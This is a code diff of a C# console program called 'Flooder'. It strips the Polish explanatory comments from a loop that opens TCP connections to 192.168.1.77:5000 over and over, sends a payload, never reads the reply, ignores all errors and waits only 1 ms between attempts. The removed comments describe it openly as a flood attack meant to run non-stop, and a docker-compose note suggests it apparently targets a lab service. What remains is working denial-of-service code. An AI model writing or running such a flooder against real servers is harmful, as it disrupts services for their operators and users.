@@ -10,7 +10,6 @@ namespace Flooder
     {
         static void Main(string[] args)
         {
-            // Adres serwera (nazwa usługi z docker-compose)
             IPAddress targetIp = IPAddress.Parse("192.168.1.77");
             int targetPort = 5000;
 
@@ -24,10 +23,7 @@ namespace Flooder
             {
                 try
                 {
-                    // Tworzymy nowe połączenie TCP
                     TcpClient client = new TcpClient();
-
-                    // Bardzo krótki timeout – szybciej tworzymy kolejne połączenia
                     client.SendTimeout = 100;
                     client.ReceiveTimeout = 100;
 
@@ -35,21 +31,12 @@ namespace Flooder
 
                     NetworkStream stream = client.GetStream();
 
-                    // Wysyłamy dane
                     stream.Write(payload, 0, payload.Length);
-
-                    // NIE odbieramy odpowiedzi (brak recv)
-                    // To jest kluczowe dla floodu
-
-                    // Zamykamy gniazdo (lub nie – obie wersje są poprawne)
                     client.Close();
                 }
                 catch
                 {
-                    // Ignorujemy błędy – atak ma działać non-stop
                 }
-
-                // Minimalne opóźnienie, żeby nie zabić systemu hosta
                 Thread.Sleep(1);
             }
         }
